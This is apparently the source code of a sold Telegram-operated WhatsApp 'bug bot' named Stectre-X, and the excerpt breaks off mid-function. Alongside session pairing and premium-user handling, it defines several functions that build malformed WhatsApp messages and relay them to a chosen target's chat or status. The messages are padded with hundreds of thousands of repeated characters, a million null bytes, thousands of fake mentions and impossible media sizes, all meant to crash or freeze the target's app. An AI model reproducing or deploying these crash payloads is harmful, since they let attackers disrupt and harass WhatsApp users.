const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const cheerio = require("cheerio");
const fetch = require("node-fetch");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const FormData = require('form-data');

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

function escapeHTML(text) {
    if (!text) return '';
    return text.toString()
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

async function uploadDeline(buffer, fileName, mimeType) {
    const form = new FormData();
    
    // Generate random filename jika perlu
    const ext = fileName.split('.').pop();
    const randomName = `${crypto.randomBytes(5).toString('hex')}.${ext}`;
    
    form.append('file', buffer, {
        filename: randomName,
        contentType: mimeType
    });

    const response = await axios.post('https://api.deline.web.id/uploader', form, {
        headers: {
            ...form.getHeaders()
        },
        maxBodyLength: 50 * 1024 * 1024,
        maxContentLength: 50 * 1024 * 1024
    });

    const data = response.data || {};
    
    if (data.status === false) {
        throw new Error(data.message || data.error || "Upload failed");
    }

    const link = data?.result?.link || data?.url || data?.path;
    
    if (!link) {
        throw new Error("Invalid response (no link found)");
    }

    return link;
}

// =========================
// FUNGSI FORMAT BYTES
// =========================
function formatBytes(bytes) {
    if (!bytes) return "0 B";
    const units = ["B", "KB", "MB", "GB", "TB"];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return `${(bytes / 1024 ** i).toFixed(2)} ${units[i]}`;
}


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/DyyZy-cyber/Dycok/refs/heads/main/tokens.json"; 

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Proccesing Check Token...."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("Pler Kanjut, Token Mu Belom Di Add"));
    process.exit(1);
  }

  console.log(chalk.green(`Joss. Token Mu Terdaftar`));
  startBot();
  initializeWhatsAppConnections();
}

function startBot() {
  console.log(chalk.red(`\n
          ░██╗░░██╗
           ╚██╗██╔╝
 ░███    ░╚███╔╝
           ░██╔██╗
           ██╔╝╚██╗
           ╚═╝░░╚═╝


█▀ ▀█▀ █▀▀ █▀ ▀█▀ █▀█ █▀▀   ▄▄ ▀▄▀
▄█ ░█░ ██▄ █▄ ░█░ █▀▄ ██▄   ░░ █░█


𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝘾𝙍𝙄𝙋𝙏 𝙎𝙏𝙀𝘾𝙏𝙍𝙀-𝙓 𝙉𝙀𝙒 𝙀𝙍𝘼
`));


console.log(chalk.bold.blue(`
═════════════════════════
        𝙎𝙏𝙀𝘾𝙏𝙍𝙀-𝙓 
═════════════════════════
`));

console.log(chalk.blue(`
═════════════════════
𝙏𝙃𝙓 𝘼𝙇𝙇 𝘽𝙐𝙔𝙀𝙍 𝙎𝙏𝙀𝘾𝙏𝙍𝙀-𝙓 
════( Succes Login )══════
`));
};

validateToken();

let sock;

function getNodeModulesSize() {
  const folderPath = path.join(__dirname, "node_modules");

  if (!fs.existsSync(folderPath)) {
    return "0 MB";
  }

  function getSize(dir) {
    let total = 0;
    const files = fs.readdirSync(dir);

    for (const file of files) {
      const filepath = path.join(dir, file);
      const stats = fs.statSync(filepath);

      if (stats.isFile()) {
        total += stats.size;
      } else if (stats.isDirectory()) {
        total += getSize(filepath);
      }
    }

    return total;
  }

  const sizeInBytes = getSize(folderPath);
  const sizeInMB = (sizeInBytes / (1024 * 1024)).toFixed(1);

  return `${sizeInMB} MB`;
}

function getWhatsAppStatus() {
  if (!sessions || sessions.size === 0) return "NoDisconnect ❌";

  for (const [botNumber, sock] of sessions) {
    if (sock?.ws?.readyState === 1) {
      return "Disconnect ✅"; 
    }
  }

  return "NoDisconnect ❌";
}

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

// FUNCTION AI COPILOT
async function copilotAI(prompt) {
  try {
    const apiUrl = "https://api.deline.web.id/ai/copilot";
    
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ prompt })
    });

    const result = await response.json();

    if (!result.status) {
      return { error: "Gagal memproses AI." };
    }

    return {
      status: true,
      answer: result.result || result.response || "Tidak ada jawaban."
    };

  } catch (e) {
    return { error: "Kesalahan server AI." };
  }
}

// Function timeout fetch
async function fetchWithTimeout(resource, timeout = 15000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    const res = await fetch(resource, { signal: controller.signal });
    clearTimeout(id);
    return res;
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `<blockquote> 𝗣𝗿𝗼𝗰𝗰𝗲𝘀 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗸𝗲   ${botNumber}.....</blockquote>
`,
      { parse_mode: "HTML" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `<blockquote> 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....</blockquote>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<blockquote> 𝗚𝗮𝗴𝗮𝗹 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗞𝗲  ${botNumber}.....</blockquote>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `<blockquote> 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨 </blockquote>
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "STECTREX");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
<blockquote> 𝗦𝘂𝗰𝗰𝗲𝘀 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 </blockquote>
𝗖𝗼𝗱𝗲 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "HTML",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<blockquote> 𝗚𝗮𝗴𝗮𝗹 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗸𝗲 𝗡𝗼𝗺𝗼𝗿  ${botNumber}....</blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "HTML",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://api.deline.web.id/iWRLJTSDZn.jpg",
        "https://api.deline.web.id/iWRLJTSDZn.jpg",
        "https://api.deline.web.id/iWRLJTSDZn.jpg",
        "https://api.deline.web.id/iWRLJTSDZn.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Contoh benar: 5s, 2m, 1h";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();

  // Menampilkan hasil dengan formatSeconds/Minutes/Hours
  return `Cooldown diatur ke ${formatCooldownMs(cooldownData.time)}`;
}

function formatCooldownMs(ms) {
  if (ms < 1000) return `${ms} ms`;
  if (ms < 60000) return `${Math.floor(ms / 1000)} Seconds`;
  if (ms < 3600000) return `${Math.floor(ms / 60000)} Minutes`;
  return `${Math.floor(ms / 3600000)} Hours`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(u => String(u.id) === String(userId));

  if (!user) return "Not Premium";

  if (new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  }

  return "Not Premium";
}

// START FUNCTION
async function YxGDahYak(sock, target) {
 const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
         protocolMessage: {
          body: { 
          title: "YxG | Yanz And Verse",
            text: "YxG - Verse",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
   }
  }, {});
const msg1 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
 const msg2 = {
 ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363330289360382@newsletter",
                serverMessageId: 1,
                newsletterName: "YxG - Anjing"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };
  
  for (const msg of [msg, msg1, msg2]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.blue(`YxG - Sending Bug To ${target} Noh Anjg Bgst`));
  }
}

async function blanktryaja(sock, target) {
  try {
    const Trushed = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "🩸" + "𑇂𑆵𑆴𑆿".repeat(20000) }
          },
            extendedTextMessage: {
              text: "hitamkan layar" +
                "ꦽ".repeat(30000) +
                "ꦾ".repeat(30000) +
                "@1".repeat(30000)
          },
          contextInfo: {
            stanzaId: target,
            participant: target,
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "./Gama.js",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "apsi ireng?" + "ꦾ".repeat(30000) + "@1".repeat(30000)
              },
              conversation:
                "hitamkan🔥" +
                "ꦽ".repeat(30000) +
                "ꦾ".repeat(30000) +
                "@1".repeat(30000)
            }
          },
          body: {
            text:
              "lu ireng" +
              "ꦽ".repeat(30000) +
              "ꦾ".repeat(30000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "cta_url",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "cta_call",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "cta_copy",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "cta_reminder",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "cta_cancel_reminder",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "address_message",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "send_location",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "quick_reply",
                buttonParamsJson: "ោ៝".repeat(30000)
              },
              {
                name: "mpm",
                buttonParamsJson: "ោ៝".repeat(30000)
              }
            ],
            flowActionPayload: {
              screen: "splash_screen",
              data: { mobile: true }
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }
    };

    const msg = generateWAMessageFromContent(target, Trushed, {});

    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
  } catch (err) {
    console.error("Error:", err);
  }
}

async function Poseidon(sock, target) {
  try {
    for (let i = 0; i < 2; i++) {
      const content = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null,
                },
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
              },
              header: {
                title: "Poseidon - Invictus",
                hasMediaAttachment: false,
                locationMessage: {
                  degreesLatitude: 992.999999,
                  degreesLongitude: -932.8889989,
                  name: "\u900A",
                  address: "\u0007".repeat(20000),
                },
              },
              body: {
                text: "⛧ 𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 • 𝐗-𝐂𝐎𝐑𝐄 ⛧",
              },
              interactiveResponseMessage: {
                body: {
                  text: "⛧ 𝐏𝐎𝐒𝐄𝐈𝐃𝐎𝐍 :: 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⛧",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  status: true,
                  messageParamsJson: "{".repeat(10000) + "[".repeat(10000),
                  paramsJson: `{
                    "screen_2_OptIn_0": true,
                    "screen_2_OptIn_1": true,
                    "screen_1_Dropdown_0": "Poseidon - Invictus",
                    "screen_1_DatePicker_1": "1028995200000",
                    "screen_1_TextInput_2": "cyber@gmail.com",
                    "screen_1_TextInput_3": "94643116",
                    "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                    "screen_0_TextInput_1": "What?",
                    "screen_0_Dropdown_2": "001-Grimgar",
                    "screen_0_RadioButtonsGroup_3": "0_true",
                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                  }`,
                  version: 3,
                },
              },
            },
          },
        },
      };

      const msg = await generateWAMessageFromContent(target, content, {});
      await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
    }

    const message = {
      extendedTextMessage: {
        text: "᬴".repeat(250000),
        contextInfo: {
          mentionedJid: Array.from({ length: 1950 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
        },
      },
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
        mimeType: "audio/mpeg",
        sha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
        encSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
        directPath:
          "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
        fileLength: 99999999999999,
        mediaKeyTimestamp: 99999999999999,
        seconds: 99999999999999,
        fileEncSha256:
          "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
      },
      interactiveResponseMessage: {
        body: {
          text: "\u0003".repeat(2000),
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request".repeat(300),
          paramsJson: JSON.stringify({
            type: "single_select",
            title: "\u2063".repeat(2000),
            description: "| ⛧ 𝐗-𝐂𝐎𝐑𝐄 :: 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⛧ |".repeat(20000),
            options: [
              {
                title: "\u2063".repeat(50),
                description: "null".repeat(15000),
                value: "꧔꧈" + "null".repeat(5000),
              },
            ],
          }),
          version: 3,
        },
      },
    };

    await sock.relayMessage("status@broadcast", message, {
      messageId: `statusbroadcast_${Date.now()}`,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    const contentButtons = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ⛧ 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⛧ ",
              hasMediaAttachment: false,
            },
            body: {
              text: " ⛧ 𝐗-𝐂𝐎𝐑𝐄 :: 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⛧ ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{[".repeat(10000),
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0003",
                },
                {
                  name: "single_select",
                  buttonParamsJson: "꧔꧈".repeat(3000),
                },
                {
                  name: "nested_call_permission",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ cameraAccess: true }),
                },
              ],
            },
          },
        },
      },
    };

    const msgButtons = await generateWAMessageFromContent(target, contentButtons, {});
    await sock.relayMessage(target, msgButtons.message, {
      messageId: msgButtons.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                "13135550101@s.whatsapp.net",
                "13135550202@s.whatsapp.net",
                "13135550303@s.whatsapp.net",
                "13135550404@s.whatsapp.net",
                "13135550505@s.whatsapp.net",
                "13135550606@s.whatsapp.net",
                "13135550707@s.whatsapp.net",
                "13135550808@s.whatsapp.net",
                "13135550809@s.whatsapp.net",
                "13135551010@s.whatsapp.net",
              ].map((jid) => ({
                tag: "to",
                attrs: { jid },
                content: undefined,
              })),
            },
          ],
        },
      ],
    });

    const Neptune = JSON.stringify({
      status: true,
      cameraAccess: true,
      microphoneAccess: false,
      autoStart: true,
      hasOverlayPermission: true,
      accessibilityEnabled: false,
      criador: "Neptune",
      messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
    });
    const parsed = JSON.parse(Neptune);

    const Msg2 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                hasMediaAttachment: false,
              },
              body: {
                text: "‌ | ⛧ 𝐗-𝐂𝐎𝐑𝐄 :: 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 ⛧ | ",
              },
              nativeFlowMessage: {
                messageParamsJson: "\u0003" + parsed.messageParamsJson,
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({ status: true }),
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ status: true }),
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );

    await sock.relayMessage(target, Msg2.message, {
      messageId: Msg2.key.id,
    });

    const Crash = {
      to: target,
      message: {
        viewOnceMessage: {
          message: {
